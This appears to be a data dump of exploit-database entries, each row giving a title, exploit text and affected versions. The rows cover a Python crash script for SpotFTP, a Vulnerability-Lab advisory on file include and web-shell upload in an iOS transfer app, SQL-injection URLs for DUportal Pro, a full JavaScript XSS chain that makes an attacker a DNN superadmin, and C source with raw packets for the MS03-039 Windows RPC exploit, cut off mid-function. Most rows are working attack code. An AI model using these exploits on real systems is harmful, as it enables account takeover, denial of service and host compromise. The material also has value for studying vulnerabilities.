48132,"SpotFTP-FTP Password Recover 2.4.8 - Denial of Service (PoC) # Exploit Title: SpotFTP-FTP Password Recover 2.4.8 - Denial of Service (PoC) # Date: 2020-24-02 # Exploit Author: Ismael Nava # Vendor Homepage: http://www.nsauditor.com/ # Software Link: http://www.nsauditor.com/spotftp.html # Version: 2.4.8 # Tested on: Windows 10 Home x64 # CVE : n/a  #STEPS # Open the program SpotFTP-FTP Password Recover # Run the python exploit script, it will create a new .txt files # Copy the content of the file ""RandomLetter.txt"" # Click in the  Enter Registration Code # In the field Key put the content of the file ""RandomLetter.txt"" # End :)  buffer = 'Z' * 1000  try:      file = open(""RandomLetter.txt"",""w"")     file.write(buffer)     file.close()      print(""Archive ready"") except:     print(""Archive no ready"")",['2.4.8'],1
30215,"Photo Video Album Transfer 1.0 iOS - Multiple Vulnerabilities Document Title: =============== Photo Video Album Transfer 1.0 iOS - Multiple Vulnerabilities   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1166   Release Date: ============= 2013-12-10   Vulnerability Laboratory ID (VL-ID): ==================================== 1166   Common Vulnerability Scoring System: ==================================== 8.8   Product & Service Introduction: =============================== Download the photos & videos from your iPhones Library to computer / PC;Upload photos & videos from your computer; Transfer photos in full resolution in *.png, *.jpg, *.zip formats;No limit of the number, size or quality of the  transferred photos;Photo Video Album Transfer is a multifunctional and easy-to-use app. It allows to transfer  photos and videos from iPhone to iPhone, from iPhone to computer and reverse. Now you can easily manage your  photo or video transfer and forget about cables, additional hardware and expensive programs. Transfer any number  of photos and videos using this irreplaceable application for iPhone.  (Copy of the Homepage: https://itunes.apple.com/en/app/photo-video-album-transfer/id682294794 )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Research Team discovered multiple web vulnerabilities in the official Photo Video Album Transfer v1.0 mobile app for apple iOS.   Vulnerability Disclosure Timeline: ================================== 2013-12-09:    Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Apple AppStore Product: Photo Video Album Transfer - Mobile Application (Igor Ciobanu) 1.0   Exploitation Technique: ======================= Remote   Severity Level: =============== Critical   Technical Details & Description: ================================ 1.1 A local file/path include web vulnerability has been discovered in the official Photo Video Album Transfer v1.0 mobile app for apple iOS. The file include vulnerability allows remote attackers to include (upload) local file or path requests to compromise the application or service.  The remote file include web vulnerability is located in the vulnerable filename value of the iOS Transfer Utility (web interface) module.  Remote attackers can manipulate the filename value in the POST method request of the browse file upload form to cpmpromise the mobile app. Remote attackers are able to include own local files by usage of the browse file upload module. The attack vecotor is persistent and the  request method is POST. The file include execute occcurs in the main file dir index list were the filenames are visible listed. The security  risk of the local file include web vulnerability is estimated as high(+) with a cvss (common vulnerability scoring system) count of 8.8(+).  Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account with password.  Successful exploitation of the vulnerability results in unauthorized local file uploads and path requests to compromise the device or mobile app.  Request Method(s): 				[+] [POST]  Vulnerable Module(s): 				[+] Browse File Upload - File send & arrival (web interface)  Vulnerable Parameter(s): 				[+] filename  Affected Module(s): 				[+] Index File Dir Listing (http://localhost:8080)    1.2 An arbitrary file upload web vulnerability has been discovered in the official Print n Share v5.5 mobile application for apple iOS. The arbitrary file upload issue allows remote attackers to upload files with multiple extensions to bypass the web-server or system validation.  The vulnerability is located in the upload file module. Remote attackers are able to upload a php or js web-shells by renaming the file with  multiple extensions to bypass the file restriction mechanism. The attacker uploads for example a web-shell with the following name and extension  `image.jpg.gif.js.php.jpg`. After the upload the attacker needs to open the file in the web application. He deletes the .jpg & . gif file  extension and can access the application with elevated access rights. The security risk of the arbitrary file upload web vulnerability is  estimated as high with a cvss (common vulnerability scoring system) count of 6.7(+).  Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privilege application user account with password. Successful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of web-shells.   Request Method(s): 				[+] [POST]  Vulnerable Module(s): 				[+] Browse File Upload - File send & arrival (web interface)  Vulnerable Parameter(s): 				[+] filename (multiple extensions)  Affected Module(s): 				[+] Index File Dir Listing (http://localhost:8080)    Proof of Concept (PoC): ======================= 1.1 The local file include web vulnerability in the file name can be exploited by remote attackers without user interaction or privileged mobile web-application user account. For security demonstration or to reproduce the vulnerability follow the provided steps and information below.  Module:	Upload Input: 	Browse File Method:	POST   Manual stepst to reproduce the vulnerability ...   1. Install and start the vulnerable mobile application 2. Open the web-server wifi transfer (localhost:8080) Note: Start to tamper the browser (http) request and response session of the next POST Request  3. Click the browse file to upload button and choose a random file of your local hd 4. Change in the POST method request of the upload the filename value and inject your own webshell, remote- or local file 5. The execute after the inject occurs in the main index file dir listing of the iOS Transfer Utility 6. Successful reproduce of the remote vulnerability!   PoC: Index File Dir List - iOS Transfer Utulity (filename)  <input name=""file[]"" accept=""image/jpeg, image/png, video/quicktime, video/x-msvideo, video/x-m4v,  video/mp4"" multiple="""" type=""file""></label><label><input name=""button"" id=""button"" value=""Submit"" type=""submit""></label></form><br> <table style=""margin:0px;"" border=""0"" cellspacing=""0"" width=""100%""> <tbody><tr style=""height: 30px; background-color: #CBCABE;""> </tr><tr><td colspan=""3"">  <a href=""..""><b> Refresh</b></a><br><br></td></tr> <tr><td>  <%20../[FILE INCLUDE VULNERABILITY VIA VULNERABLE FILENAME!]""></td><td>     0.1 Kb</td><td>08.12.2013 15:58</td></tr> <tr  style='height: 180px;'><td style=""text-align: center;"" > <a href=""IMG_0556_th.png""><img src=""IMG_0556_th.png""   height=""110px"" style=""max-width: 110px""><br>IMG_0556_th.png</a><br>     2.9 Kb</td> </table> <input type=""hidden"" value=""numberOfAvailableFiles=IMG_0556_th.png,endOFF""/><br> </div> </body></html></iframe></td></tr></tbody></table></div></body></html>    --- PoC Session Request Logs --- Status: 200[OK] POST http://192.168.2.106:8080/  Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ]  Content Size[59002] Mime Type[application/x-unknown-content-type]     Request Headers: Host[192.168.2.106:8080] User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0] Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8] Accept-Language[en-US,en;q=0.5] Accept-Encoding[gzip, deflate] DNT[1] Referer[http://192.168.2.106:8080/] Cookie[com.sharkfood.airGallery.thumbSize=140; com.sharkfood.airGallery.settings.slideTime=5;  com.sharkfood.airGallery.settings.shuffle=false; com.sharkfood.airGallery.settings.repeat=true] Connection[keep-alive]      Post Data: POST_DATA[-----------------------------1863134445217 Content-Disposition: form-data; name=""file[]""; filename=""<../[FILE INCLUDE VULNERABILITY VIA VULNERABLE FILENAME!]>"" Content-Type: image/png  Status: 200 OK GET http://192.168.2.106:8080/a Load Flags[LOAD_DOCUMENT_URI  ]  Content Size[0] Mime Type[application/x-unknown-content-type]     Request Headers: Host[192.168.2.106:8080] User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0] Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8] Accept-Language[en-US,en;q=0.5] Accept-Encoding[gzip, deflate] DNT[1] Referer[http://192.168.2.106:8080/] Cookie[com.sharkfood.airGallery.thumbSize=140; com.sharkfood.airGallery.settings.slideTime=5;  com.sharkfood.airGallery.settings.shuffle=false; com.sharkfood.airGallery.settings.repeat=true] Connection[keep-alive]     Response Headers: Accept-Ranges[bytes] Content-Length[0] Date[So., 08 Dez. 2013 14:58:35 GMT]    1.2 The arbitrary file upload and restricted upload bypass vulnerability can be exploited by remote attackers without privileged web-application  user account or user interaction. For security demonstration or to reproduce the vulnerability follow the provided steps and information below.   PoC:   <body><div class=""header"" id=""header"">    </div> <div class=""container"" id=""container""><br> <table style=""margin:0px;"" border=""0"" cellspacing=""0"" width=""100%""> <tbody><tr style=""height: 30px; background-color: #CBCABE;""> </tr><tr><td colspan=""3"">  <a href=""..""><b> Refresh</b></a><br><br> </td></tr><tr style=""height: 180px;""> <td style=""text-align: center;""> <a href=""file.jpg.gif.js.html.php.gif.jpg[ARBITRARY FILE UPLOAD & RESTRICTED UPLOAD BYPASS VULNERABILITY!]""> <img src=""file.jpg.gif.js.html.php.gif.jpg[ARBITRARY FILE UPLOAD & RESTRICTED UPLOAD BYPASS VULNERABILITY!]>""  style=""max-width: 110px"" height=""110px""><br><iframe src=""a""></a><br>     0.1 Kb</td> <td style=""text-align: center;"" > <a href=""IMG_0441.MOV""><img src=""IMG_0441_th.png""  height=""110px"" style=""max-width: 110px""> <br>IMG_0441.MOV</a><br>657665.1 Kb</td> </table>   --- PoC Session Logs ---  Status: 200[OK] GET http://192.168.2.106:8080/  Load Flags[VALIDATE_ALWAYS LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ]  Content Size[58702] Mime Type[application/x-unknown-content-type]     Request Headers: Host[192.168.2.106:8080] User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0] Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8] Accept-Language[en-US,en;q=0.5] Accept-Encoding[gzip, deflate] DNT[1] Referer[http://192.168.2.106:8080/] Cookie[com.sharkfood.airGallery.thumbSize=140; com.sharkfood.airGallery.settings.slideTime=5;  com.sharkfood.airGallery.settings.shuffle=false; com.sharkfood.airGallery.settings.repeat=true] Connection[keep-alive] Cache-Control[max-age=0]  Response Headers: Accept-Ranges[bytes] Content-Length[58702] Date[So., 08 Dez. 2013 15:34:33 GMT] 16:30:12.476[313ms][total 313ms]    Status: 200[OK] GET http://192.168.2.106:8080/file.jpg.gif.js.html.php.gif.jpg[ARBITRARY FILE UPLOAD & RESTRICTED UPLOAD BYPASS VULNERABILITY!] Load Flags[VALIDATE_ALWAYS ]  Content Size[124] Mime Type[:image/jpeg]  Request Headers: Host[192.168.2.106:8080] User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0] Accept[image/png,image/*;q=0.8,*/*;q=0.5] Accept-Language[en-US,en;q=0.5] Accept-Encoding[gzip, deflate] DNT[1] Referer[http://192.168.2.106:8080/] Cookie[com.sharkfood.airGallery.thumbSize=140; com.sharkfood.airGallery.settings.slideTime=5;  com.sharkfood.airGallery.settings.shuffle=false; com.sharkfood.airGallery.settings.repeat=true] Connection[keep-alive] Cache-Control[max-age=0]  Response Headers: Content-Disposition[:attachment; filename=""file.jpg.gif.js.html.php.gif.jpg""] Content-Length[124] Accept-Ranges[bytes] Content-Type[:image/jpeg] Date[So., 08 Dez. 2013 15:34:33 GMT]   Reference(s): http://localhost:8080/   Solution - Fix & Patch: ======================= 1.1 The file include web vulnerability can be patched by a secure filter mechanism and exception-handlign to prevent code execution via  filename value.  1.2 Restrict and filter the filename input value in the upload POST method request to ensure the right format is attached. Restrict the image file access right to view only ;)   Security Risk: ============== 1.1 The security risk of the local file include web vulnerability is estimated as critical because of the location in the main filename value.  1.2 The security risk of the arbitrary file upload web vulnerability and restricted upload bypass bug is  estimated high.   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       - admin@evolution-sec.com Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright � 2013 | Vulnerability Laboratory [Evolution Security]    --  VULNERABILITY LABORATORY RESEARCH TEAM DOMAIN: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com","['iOS', 'v1.0']",0
25477,"DUportal Pro 3.4 - 'search.asp?iChannel' SQL Injection source: https://www.securityfocus.com/bid/13285/info   DUportal Pro is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in SQL queries.   A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.   These vulnerabilities are reported to affect DUportal Pro 3.4; earlier versions may also be affected.   http://www.example.com/dUpro/Businesses/../home/search.asp?keyword=dcrab&iChannel=&#039;SQL_INJECTION http://www.example.com/dUpro/Classifieds/../home/search.asp?keyword=dcrab&iChannel=&#039;SQL_INJECTION http://www.example.com/dUpro/Events/../home/search.asp?keyword=dcrab&iChannel=&#039;SQL_INJECTION http://www.example.com/dUpro/events/../home/search.asp?keyword=dcrab&iChannel=&#039;SQL_INJECTION http://www.example.com/dUpro/Files/../home/search.asp?keyword=dcrab&iChannel=&#039;SQL_INJECTION http://www.example.com/dUpro/home/../home/search.asp?keyword=dcrab&iChannel=&#039;SQL_INJECTION http://www.example.com/dUpro/Pictures/../home/search.asp?keyword=dcrab&iChannel=&#039;SQL_INJECTION http://www.example.com/dUpro/polls/../polls/../home/search.asp?keyword=dcrab&iChannel=&#039;SQL_INJECTION http://www.example.com/dUpro/Topics/../home/search.asp?keyword=dcrab&iChannel=&#039;SQL_INJECTION http://www.example.com/dUpro/home/../home/search.asp?keyword=&#039;SQL_ERRORS&iChannel= http://www.example.com/dUpro/Topics/../home/search.asp?keyword=&#039;SQL_ERRORS&iChannel=",['3.4'],1
47449,"DotNetNuke 9.3.2 - Cross-Site Scripting /* Exploit Title: ""Display Name"" Stored Unauthenticated XSS in DNN v9.3.2 Date: 4th of July, 2019 Exploit Author: Semen Alexandrovich Lyhin Vendor Homepage: https://www.dnnsoftware.com/ Software Link: https://github.com/dnnsoftware/Dnn.Platform/releases Version: v9.3.2 CVE : CVE-2019-13293  A malicious unauthenticated person can attempt to register a user with the XSS payload in ""Display Name"" parameter.  The administrator of the website will see a notification that a new user needs to be approved. An administrator should click on this notification, and the JavaScript code will be executed in the administrator's browser.  This exploit adds the user, and grants him administrator priviliges.   A native module ""module creator"" also allows remote code execution.   */    function ApproveNotification(baseurl, id) { 	return new Promise(function (resolve, reject) {	 		var url = baseurl + ""/Activity-Feed/Messages/""; 		var xhr = new XMLHttpRequest(); 		xhr.onreadystatechange = function () { 			if (xhr.readyState == 4) { 				var data; 				if (!xhr.responseType === ""text"") { 					data = xhr.responseText; 				} else if (xhr.responseType === ""document"") { 					data = xhr.responseXML; 				} else { 					data = xhr.response; 				}  				var parser = new DOMParser(); 				var resp = parser.parseFromString(data, ""text/html""); 				token = resp.getElementsByName('__RequestVerificationToken')[0].value; //grab first available token 				 				var post_params = ""NotificationId="" + id; 				var x1 = new XMLHttpRequest(); 				 				x1.open(""POST"", baseurl + ""/API/InternalServices/NewUserNotificationService/Authorize""); 				x1.setRequestHeader(""Content-Type"", ""application/x-www-form-urlencoded; charset=utf-8""); 				x1.setRequestHeader('RequestVerificationToken', token); 				x1.send(post_params); 				resolve(); 			} 		} 		xhr.open('GET', url, true); 		xhr.send(null); 	}); }  function MakeSuperAdmin(baseurl, id) { 	return new Promise(function (resolve, reject) {	 		var url = baseurl + ""/Activity-Feed/Messages/""; 		var xhr = new XMLHttpRequest(); 		xhr.onreadystatechange = function () { 			if (xhr.readyState == 4) { 				var data; 				if (!xhr.responseType === ""text"") { 					data = xhr.responseText; 				} else if (xhr.responseType === ""document"") { 					data = xhr.responseXML; 				} else { 					data = xhr.response; 				}  				var parser = new DOMParser(); 				var resp = parser.parseFromString(data, ""text/html""); 				token = resp.getElementsByName('__RequestVerificationToken')[0].value; //grab first available token 				 				var post_params = ""null"" 				var x1 = new XMLHttpRequest(); 				 				x1.open(""POST"", baseurl + ""/API/PersonaBar/Users/UpdateSuperUserStatus?userId="" + id + ""&setSuperUser=true""); 				x1.setRequestHeader(""Content-Type"", ""application/x-www-form-urlencoded; charset=utf-8""); 				x1.setRequestHeader('RequestVerificationToken', token); 				x1.send(post_params); 				resolve(); 			} 		} 		xhr.open('GET', url, true); 		xhr.send(null); 	}); }  function GetNotification(baseurl, username, moduleid, tabid) { 	return new Promise(function (resolve, reject) {	 		var url = baseurl +""/dotnetnuke/Activity-Feed/Messages/"" 		var xhr = new XMLHttpRequest(); 		xhr.onreadystatechange = function () { 			if (xhr.readyState == 4) { 				var data; 				if (!xhr.responseType === ""text"") { 					data = xhr.responseText; 				} else if (xhr.responseType === ""document"") { 					data = xhr.responseXML; 				} else { 					data = xhr.response; 				}  				var parser = new DOMParser(); 				var resp = parser.parseFromString(data, ""text/html""); 				token = resp.getElementsByName('__RequestVerificationToken')[0].value; //grab first available token 				 				var x1 = new XMLHttpRequest(); 				 				x1.open(""GET"", baseurl + ""/API/CoreMessaging/MessagingService/Notifications?afterNotificationId=-1&numberOfRecords=1000&_=1562677665517"", true); 				x1.setRequestHeader('ModuleId', moduleid); 				x1.setRequestHeader('TabId', tabid); 				x1.onreadystatechange = () => { 					 					if (x1.readyState == 4) { 						if (!x1.responseType === ""text"") { 							data = x1.responseText; 						} else if (x1.responseType === ""document"") { 							data = x1.responseXML; 						} else { 							data = x1.response; 						} 						 						//console.log(JSON.parse(data)); 						data = JSON.parse(data); 						 						for (var key in data['Notifications']){ 							if (data['Notifications'][key]['Body'].includes(username)) { 								resolve((data['Notifications'][key]['NotificationId'])); 							}; 						} 						reject(); 					} 				} 				x1.send(null); 			} 		} 		xhr.open('GET', url, true); 		xhr.send(null); 	}); }  function GetUserId(baseurl, username, tabid) { 	return new Promise(function (resolve, reject) {	 		var url = baseurl +""/dotnetnuke/Activity-Feed/Messages/"" 		var xhr = new XMLHttpRequest(); 		xhr.onreadystatechange = function () { 			if (xhr.readyState == 4) { 				var data; 				if (!xhr.responseType === ""text"") { 					data = xhr.responseText; 				} else if (xhr.responseType === ""document"") { 					data = xhr.responseXML; 				} else { 					data = xhr.response; 				}  				var parser = new DOMParser(); 				var resp = parser.parseFromString(data, ""text/html""); 				token = resp.getElementsByName('__RequestVerificationToken')[0].value; //grab first available token 				 				var x1 = new XMLHttpRequest(); 				 				x1.open(""GET"", baseurl + ""/API/PersonaBar/Users/GetUsers?searchText="" + username + ""&filter=0&pageIndex=0&pageSize=10&sortColumn=&sortAscending=false"", true); 				x1.setRequestHeader('TabId', tabid); 				x1.onreadystatechange = () => { 					if (x1.readyState == 4) { 						if (!x1.responseType === ""text"") { 							data = x1.responseText; 						} else if (x1.responseType === ""document"") { 							data = x1.responseXML; 						} else { 							data = x1.response; 						} 						 						//console.log(data); 						data = JSON.parse(data); 					    resolve((data['Results'][0]['userId'])); 						 						reject(); 					} 				} 				x1.send(null); 			} 		} 		xhr.open('GET', url, true); 		xhr.send(null); 	}); }   async function main(){ 	var username = ""nobody34567""; 	var baseurl = ""http://192.168.18.10/dotnetnuke/""; 	var moduleid = ""374"";  	var tabid = ""27""; //It's default ID of the module and tab, that should be used to get notification id. We can also parse it from the webpage.      var NotificationId = await GetNotification(baseurl, username, moduleid, tabid); 	await ApproveNotification(baseurl, NotificationId); 	var UserID = await GetUserId(baseurl, username, tabid); 	MakeSuperAdmin(baseurl, UserID); }  main();",['9.3.2'],1
109,"Microsoft Windows - 'RPC2' Universal / Denial of Service (RPC3) (MS03-039) /*  Windows RPC2 Universal Exploit (MS03-039) & Remote DoS (RPC3)  */ /*                    Must be used with the associated shell                        */ /*                                                                                                  */ /*           This exploit works against unpatched systems (MS03-039)     */ /*             And cause a Denial of Service on patched systems (rpc3)     */   #include <stdio.h>  #include <winsock2.h>  #include <windows.h>  #include <process.h>  #include <string.h>  #include <winbase.h>   FILE *fp1;  unsigned char bindstr[]={  0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,  0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,  0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,  0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,  0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};   unsigned char request1[]={  0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03  ,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00  ,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45  ,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E  ,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D  ,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41  ,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00  ,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45  ,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00  ,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00  ,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03  ,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00  ,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29  ,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00  ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00  ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00  ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00  ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00  ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00  ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00  ,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00  ,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00  ,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10  ,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF  ,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10  ,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09  ,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00  ,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00  ,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00  ,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00  ,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01  ,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03  ,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00  ,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E  ,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00  ,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00  ,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00  ,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00  ,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00  ,0x00,0x00,0x00,0x00,0x00,0x00};   unsigned char request2[]={  0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00  ,0x00,0x00,0x5C,0x00,0x5C,0x00};   unsigned char request3[]={  0x46,0x00,0x43,0x00,0x24,0x00,0x46,0x00,  0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00  ,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00  ,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00  ,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};    unsigned char request4[]={  0x01,0x10  ,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00  ,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C  ,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00  };  void XOR(unsigned char *buf,int offset,int 